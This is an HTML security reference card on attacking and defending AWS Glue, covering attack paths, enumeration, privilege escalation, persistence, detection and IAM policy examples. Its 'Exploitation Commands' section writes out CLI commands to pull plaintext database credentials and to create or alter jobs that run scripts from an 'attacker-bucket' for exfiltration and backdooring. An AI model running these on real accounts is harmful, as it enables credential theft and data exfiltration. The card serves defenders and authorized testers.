@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AWS Glue Security | AWS Security Cards</title>
+<meta name="description" content="AWS Glue is a serverless data integration service for ETL jobs and data cataloging. Attackers exploit Glue to execute code via jobs, access sensitive data through crawlers, and leverage the Data Catalog to discover database schemas and connection credentials.">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: #0a0e1a;
+    color: #e2e8f0;
+    line-height: 1.6;
+    padding: 2rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  a { color: #22d3ee; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* Card Image */
+  .card-image {
+    border-radius: 1rem;
+    overflow: hidden;
+    margin-bottom: 2rem;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .card-image img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+
+  /* Header */
+  .header {
+    position: relative;
+    overflow: hidden;
+    border-radius: 1rem;
+    background: linear-gradient(135deg, #06b6d415, #0a0e1a, #0ea5e915);
+    border: 1px solid #06b6d44d;
+    padding: 2.5rem;
+    margin-bottom: 2rem;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 24rem; height: 24rem;
+    background: #06b6d40d;
+    border-radius: 50%;
+    filter: blur(3rem);
+  }
+  .header-content { position: relative; display: flex; align-items: flex-start; gap: 1.5rem; }
+  .header-icon { width: 64px; height: 64px; flex-shrink: 0; }
+  .header-icon img { width: 100%; height: 100%; }
+  .header-title { font-size: 1.875rem; font-weight: 700; color: #fff; }
+  .header-badge {
+    display: inline-block;
+    padding: 0.25rem 0.75rem;
+    background: #06b6d433;
+    color: #06b6d4;
+    font-size: 0.8rem;
+    font-weight: 600;
+    border-radius: 999px;
+    border: 1px solid #06b6d44d;
+    margin-left: 0.75rem;
+    vertical-align: middle;
+  }
+  .header-desc { color: #94a3b8; max-width: 42rem; margin-top: 0.5rem; }
+
+  /* Stats */
+  .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
+  .stat-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+    text-align: center;
+  }
+  .stat-value { font-size: 1.5rem; font-weight: 700; }
+  .stat-label { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Sections */
+  .section {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+  .section h2 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  /* Overview */
+  .overview-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .overview-grid h4 { font-size: 0.9rem; font-weight: 600; margin-bottom: 0.5rem; }
+  .overview-grid p { font-size: 0.875rem; color: #94a3b8; margin-bottom: 0.75rem; }
+  .attack-note {
+    background: rgba(0,0,0,0.3);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 0.75rem;
+    font-size: 0.875rem;
+    color: #cbd5e1;
+  }
+
+  /* Risk Gauge */
+  .risk-gauge { display: flex; align-items: center; gap: 2rem; }
+  .risk-bar-container { flex: 1; }
+  .risk-bar {
+    height: 1rem;
+    background: #0f172a;
+    border-radius: 999px;
+    overflow: hidden;
+  }
+  .risk-bar-fill {
+    height: 100%;
+    border-radius: 999px;
+    background: linear-gradient(90deg, #eab308, #f97316, #ef4444);
+  }
+  .risk-labels { display: flex; justify-content: space-between; font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem; }
+  .risk-score { text-align: center; }
+  .risk-score-value { font-size: 2.5rem; font-weight: 700; color: #f87171; }
+  .risk-score-label { font-size: 0.8rem; color: #94a3b8; }
+  .risk-desc { margin-top: 1rem; font-size: 0.875rem; color: #94a3b8; }
+
+  /* Panels Grid */
+  .panels-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; margin-bottom: 1.5rem; }
+  @media (max-width: 1024px) { .panels-grid { grid-template-columns: repeat(2, 1fr); } }
+  @media (max-width: 640px) { .panels-grid, .stats-row, .overview-grid { grid-template-columns: 1fr; } }
+  .panel {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid;
+    padding: 1.5rem;
+  }
+  .panel h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+  .panel h4 { font-size: 0.85rem; font-weight: 600; margin-bottom: 0.5rem; margin-top: 1rem; }
+  .panel ul { list-style: none; padding: 0; }
+  .panel li {
+    font-size: 0.85rem;
+    color: #cbd5e1;
+    padding: 0.15rem 0;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+  }
+  .bullet { margin-top: 0.15rem; }
+  .note {
+    margin-top: 1rem;
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    font-size: 0.85rem;
+  }
+
+  /* Commands */
+  .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .cmd-block { margin-top: 0.75rem; }
+  .cmd-title { font-size: 0.8rem; color: #94a3b8; margin-bottom: 0.25rem; }
+  pre {
+    background: rgba(0,0,0,0.5);
+    border-radius: 0.5rem;
+    padding: 0.75rem;
+    font-size: 0.8rem;
+    color: #4ade80;
+    overflow-x: auto;
+    border: 1px solid rgba(255,255,255,0.06);
+    white-space: pre-wrap;
+    word-break: break-all;
+    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+  }
+
+  /* Policies */
+  .policy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .policy-card {
+    border-radius: 0.5rem;
+    border: 1px solid;
+    padding: 1rem;
+  }
+  .policy-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.75rem; font-size: 0.9rem; }
+  .policy-card pre { margin-bottom: 0.75rem; color: #cbd5e1; }
+  .policy-desc { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Defenses */
+  .defense-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .defense-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+  }
+  .defense-card:hover { border-color: #22d3ee4d; }
+  .defense-header { display: flex; align-items: flex-start; gap: 0.75rem; }
+  .defense-icon { font-size: 1.5rem; }
+  .defense-card h4 { font-size: 0.9rem; font-weight: 600; color: #fff; margin-bottom: 0.25rem; }
+  .defense-card p { font-size: 0.85rem; color: #94a3b8; margin-bottom: 0.5rem; }
+  .defense-card pre { color: #22d3ee; }
+
+  /* Footer */
+  .footer { text-align: center; padding: 1.5rem 0; font-size: 0.8rem; color: #64748b; }
+  .footer a { color: #22d3ee; }
+
+  /* Prevent ugly page-break splits */
+  .card-image,
+  .header,
+  .stat-card,
+  .stats-row,
+  .section,
+  .panel,
+  .cmd-block,
+  .policy-card,
+  .defense-card,
+  .attack-note,
+  .overview-grid > div,
+  .risk-gauge,
+  .note {
+    break-inside: avoid;
+    page-break-inside: avoid;
+  }
+  .section,
+  .panels-grid,
+  .card-image,
+  .header {
+    break-before: auto;
+    page-break-before: auto;
+  }
+  /* Keep headings with their content */
+  h2, h3, h4 {
+    break-after: avoid;
+    page-break-after: avoid;
+  }
+
+  @media print {
+    body { background: #0a0e1a; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    /* Switch panels to 2-col for better page flow */
+    .panels-grid { grid-template-columns: repeat(2, 1fr); }
+    /* Switch commands and policies to single column to avoid splits */
+    .cmd-grid { grid-template-columns: 1fr; }
+    .policy-grid { grid-template-columns: 1fr; }
+    .defense-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Card Image -->
+<div class="card-image">
+  <img src="../images/glue-card.webp" alt="AWS Glue Security" />
+</div>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-content">
+    <div class="header-icon"><img src="../icons/glue.svg" alt="AWS Glue Security" /></div>
+    <div>
+      <div>
+        <span class="header-title">AWS Glue Security</span>
+        <span class="header-badge">ETL &amp; DATA CATALOG</span>
+      </div>
+      <p class="header-desc">AWS Glue is a serverless data integration service for ETL jobs and data cataloging. Attackers exploit Glue to execute code via jobs, access sensitive data through crawlers, and leverage the Data Catalog to discover database schemas and connection credentials.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats-row">
+        <div class="stat-card">
+          <div class="stat-value" style="color: #f87171;">CRITICAL</div>
+          <div class="stat-label">Code Execution Risk</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #4ade80;">TB+</div>
+          <div class="stat-label">Data Access Potential</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #60a5fa;">4</div>
+          <div class="stat-label">Job Types</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #c084fc;">Secrets</div>
+          <div class="stat-label">Connection Strings</div>
+        </div></div>
+
+<!-- Overview -->
+<div class="section"><h2><span style="color:#06b6d4;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+        <div>
+          <h4 style="color: #06b6d4;">ETL Jobs &amp; Code Execution</h4>
+          <p>Glue jobs execute PySpark or Python shell scripts with powerful IAM roles. Jobs access S3 data, databases via JDBC connections, and the Data Catalog. Development endpoints provide interactive shell access with the job's IAM role.</p>
+          <div class="attack-note"><span style="color:#06b6d4;">Attack note:</span> Creating a Glue job with a privileged IAM role gives arbitrary code execution with those permissions</div>
+        </div>
+        <div>
+          <h4 style="color: #06b6d4;">Data Catalog &amp; Connections</h4>
+          <p>The Data Catalog stores table schemas, S3 locations, and database metadata. Connections contain JDBC URLs, usernames, and passwords for RDS, Redshift, and external databases. Crawlers automatically discover and catalog data sources.</p>
+          <div class="attack-note"><span style="color:#06b6d4;">Attack note:</span> GetConnection returns database credentials in plaintext - the #1 quick win in Glue exploitation</div>
+        </div></div></div>
+
+<!-- Risk Assessment -->
+
+<div class="section">
+  <h2>Security Risk Assessment</h2>
+  <div class="risk-gauge">
+    <div class="risk-bar-container">
+      <div class="risk-bar">
+        <div class="risk-bar-fill" style="width: 90%;"></div>
+      </div>
+      <div class="risk-labels"><span>Low</span><span>Medium</span><span>High</span><span>Critical</span></div>
+    </div>
+    <div class="risk-score">
+      <div class="risk-score-value">9.0</div>
+      <div class="risk-score-label">Risk Score</div>
+    </div>
+  </div>
+  <p class="risk-desc">Glue jobs execute arbitrary code with powerful IAM roles. Connections contain database credentials. Data Catalog reveals schema information for entire data infrastructure. Development endpoints provide interactive shell access.</p>
+</div>
+
+<!-- Main Panels -->
+<div class="panels-grid">
+      <div class="panel" style="border-color: #f8717133;">
+        <h3 style="color: #f87171;">⚔️ Attack Vectors</h3><h4 style="color: #f87171;">Code Execution</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Malicious job creation/modification</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Development endpoint SSH/notebook access</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Job script injection via S3 poisoning</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Crawler configuration manipulation</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Interactive session abuse</li></ul><h4 style="color: #f87171;">Data Access</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Connection credential extraction (plaintext)</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Data Catalog schema enumeration</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Job output data exfiltration to S3</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Crawled data source discovery</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Cross-account catalog exploitation</li></ul></div>
+      <div class="panel" style="border-color: #fb923c33;">
+        <h3 style="color: #fb923c;">⚠️ Misconfigurations</h3><h4 style="color: #fb923c;">Role Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Overly permissive job IAM roles (s3:*, glue:*)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Dev endpoints with admin-level roles</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> PassRole without resource restrictions</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No separation of crawler vs job roles</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Shared roles across sensitive/non-sensitive jobs</li></ul><h4 style="color: #fb923c;">Security Gaps</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Unencrypted connection passwords</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Data Catalog without resource policies</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Dev endpoints without VPC isolation</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Missing continuous CloudWatch logging</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No job parameter validation</li></ul></div>
+      <div class="panel" style="border-color: #22d3ee33;">
+        <h3 style="color: #22d3ee;">🔍 Enumeration</h3>
+        <div class="cmd-block">
+          <div class="cmd-title">List Databases</div>
+          <pre><code>aws glue get-databases</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Tables</div>
+          <pre><code>aws glue get-tables --database-name mydb</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Connections</div>
+          <pre><code>aws glue get-connections</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Jobs</div>
+          <pre><code>aws glue get-jobs</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Dev Endpoints</div>
+          <pre><code>aws glue get-dev-endpoints</code></pre>
+        </div></div>
+      <div class="panel" style="border-color: #c084fc33;">
+        <h3 style="color: #c084fc;">📈 Privilege Escalation</h3><h4 style="color: #c084fc;">Direct Escalation</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Create job with admin IAM role (PassRole)</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Modify existing job to run attacker code</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> SSH to dev endpoint with job role</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Extract DB creds and pivot to RDS/Redshift</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Use job role to access Secrets Manager</li></ul><h4 style="color: #c084fc;">Data Catalog Poisoning</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Modify table locations to point to attacker S3</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Create fake table in catalog for phishing</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Update partition locations for data redirect</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Inject malicious ETL scripts via catalog metadata</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Grant cross-account access to catalog</li></ul><div class="note"><strong>Key insight:</strong> iam:PassRole + glue:CreateJob = arbitrary code execution with any role. This is a known privesc path in Pacu and Rhino Security research.</div></div>
+      <div class="panel" style="border-color: #facc1533;">
+        <h3 style="color: #facc15;">🔗 Persistence</h3><h4 style="color: #facc15;">Job-Based Persistence</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create triggered job that runs on schedule</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Modify existing job to include backdoor code</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Bookmark manipulation for recurring access</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Workflow with triggered execution</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Dev endpoint as persistent backdoor</li></ul><h4 style="color: #facc15;">Data Pipeline Persistence</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Add crawler that exfils schema changes</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Modify job output to copy data to attacker S3</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create trigger on new data arrival</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Embed exfiltration in legitimate ETL code</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Use job parameters for dynamic C2 endpoints</li></ul></div>
+      <div class="panel" style="border-color: #4ade8033;">
+        <h3 style="color: #4ade80;">🛡️ Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateJob / UpdateJob</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> StartJobRun (new execution)</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateDevEndpoint</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> GetConnection (credential access)</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdateCrawler / StartCrawler</li></ul><h4 style="color: #4ade80;">Indicators of Compromise</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Jobs created by unusual principals</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Dev endpoint creation (often disabled)</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> GetConnection calls from non-ETL roles</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Job runs at unusual times or frequency</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Script location pointing to unknown S3 buckets</li></ul></div></div>
+
+<!-- Exploitation -->
+<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid">
+        <div class="cmd-block">
+          <div class="cmd-title">Extract Connection Credentials</div>
+          <pre><code>aws glue get-connection \\
+  --name my-rds-connection \\
+  --query 'Connection.ConnectionProperties'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Create Malicious Job</div>
+          <pre><code>aws glue create-job \\
+  --name exfil-job \\
+  --role arn:aws:iam::123456789012:role/GlueRole \\
+  --command '{&quot;name&quot;:&quot;pythonshell&quot;,
+    &quot;scriptLocation&quot;:&quot;s3://attacker-bucket/exfil.py&quot;}'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Run the Malicious Job</div>
+          <pre><code>aws glue start-job-run --job-name exfil-job</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Modify Existing Job Script</div>
+          <pre><code>aws glue update-job --job-name legit-etl \\
+  --job-update '{&quot;Command&quot;:{&quot;ScriptLocation&quot;:
+    &quot;s3://attacker-bucket/backdoored-script.py&quot;}}'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Enumerate All Table Locations</div>
+          <pre><code>aws glue get-tables --database-name mydb \\
+  --query 'TableList[*].[Name,StorageDescriptor.Location]'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Job Run Logs</div>
+          <pre><code>aws glue get-job-runs --job-name my-etl-job \\
+  --query 'JobRuns[*].[Id,JobRunState,ErrorMessage]'</code></pre>
+        </div></div></div>
+
+<!-- Policies -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid">
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Full Glue Access</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: &quot;glue:*&quot;,
+  &quot;Resource&quot;: &quot;*&quot;
+}</code></pre>
+          <p class="policy-desc">Full Glue access enables job creation, credential extraction, and RCE via job roles</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Read-Only Catalog</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: [
+    &quot;glue:GetDatabase&quot;,
+    &quot;glue:GetDatabases&quot;,
+    &quot;glue:GetTable&quot;,
+    &quot;glue:GetTables&quot;
+  ],
+  &quot;Resource&quot;: [
+    &quot;arn:aws:glue:*:*:catalog&quot;,
+    &quot;arn:aws:glue:*:*:database/*&quot;,
+    &quot;arn:aws:glue:*:*:table/*/*&quot;
+  ]
+}</code></pre>
+          <p class="policy-desc">Limited to viewing catalog metadata without job or connection access</p>
+        </div>
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - PassRole + CreateJob</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: [
+    &quot;glue:CreateJob&quot;,
+    &quot;glue:StartJobRun&quot;,
+    &quot;iam:PassRole&quot;
+  ],
+  &quot;Resource&quot;: &quot;*&quot;
+}</code></pre>
+          <p class="policy-desc">PassRole + CreateJob = arbitrary code execution with any Glue-assumable role</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Deny Connection Credentials</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Deny&quot;,
+  &quot;Action&quot;: &quot;glue:GetConnection&quot;,
+  &quot;Resource&quot;: &quot;*&quot;,
+  &quot;Condition&quot;: {
+    &quot;StringNotEquals&quot;: {
+      &quot;aws:PrincipalTag/team&quot;: &quot;data-engineering&quot;
+    }
+  }
+}</code></pre>
+          <p class="policy-desc">Only data engineering team can retrieve connection credentials</p>
+        </div></div></div>
+
+<!-- Defenses -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid">
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔐</span>
+            <div>
+              <h4>Encrypt Connection Credentials</h4>
+              <p>Store credentials in Secrets Manager instead of Glue connections. Encrypt with KMS.</p>
+              <pre><code>JDBC_ENFORCE_SSL=true in connection properties</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🛡️</span>
+            <div>
+              <h4>Restrict Job IAM Roles</h4>
+              <p>Use least privilege roles per job. Never share admin roles across jobs.</p>
+              <pre><code>&quot;Effect&quot;: &quot;Allow&quot;,
+&quot;Action&quot;: &quot;iam:PassRole&quot;,
+&quot;Resource&quot;: &quot;arn:aws:iam::*:role/GlueJob-*&quot;,
+&quot;Condition&quot;: {&quot;StringEquals&quot;: {
+  &quot;iam:PassedToService&quot;: &quot;glue.amazonaws.com&quot;
+}}</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">👁️</span>
+            <div>
+              <h4>Enable Job Logging</h4>
+              <p>Enable continuous CloudWatch logging for all Glue jobs for audit trail.</p>
+              <pre><code>--enable-continuous-cloudwatch-log true</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🌐</span>
+            <div>
+              <h4>VPC for All Endpoints</h4>
+              <p>Place dev endpoints and jobs in private VPCs without direct internet access.</p>
+              <pre><code>aws glue create-dev-endpoint \\
+  --security-group-ids sg-xxx \\
+  --subnet-id subnet-xxx</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔑</span>
+            <div>
+              <h4>Data Catalog Encryption</h4>
+              <p>Enable encryption at rest for the Data Catalog with customer-managed KMS key.</p>
+              <pre><code>aws glue put-data-catalog-encryption-settings \\
+  --data-catalog-encryption-settings '{
+    &quot;EncryptionAtRest&quot;:{&quot;CatalogEncryptionMode&quot;:&quot;SSE-KMS&quot;,
+    &quot;SseAwsKmsKeyId&quot;:&quot;alias/glue-catalog&quot;}}'</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📊</span>
+            <div>
+              <h4>Monitor Job Changes</h4>
+              <p>Alert on CreateJob, UpdateJob, GetConnection, and unusual StartJobRun patterns.</p>
+              <pre><code>EventBridge rule on glue.amazonaws.com events:
+CreateJob, UpdateJob, GetConnection, CreateDevEndpoint</code></pre>
+            </div>
+          </div>
+        </div></div></div>
+
+<!-- Footer -->
+<div class="footer">
+  <p>AWS Glue Security Card</p>
+  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+</div>
+
+</body>
+</html>
